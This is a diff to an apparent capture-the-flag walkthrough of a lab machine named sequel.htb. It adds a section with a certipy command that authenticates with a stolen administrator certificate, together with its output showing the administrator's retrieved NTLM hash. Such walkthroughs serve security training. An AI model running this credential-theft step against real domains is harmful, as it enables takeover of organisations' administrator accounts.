@@ -827,6 +827,16 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\Administrator\desktop> exit
 ```
+#### Administrator 的 NTLM hash:
+```
+#certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
 
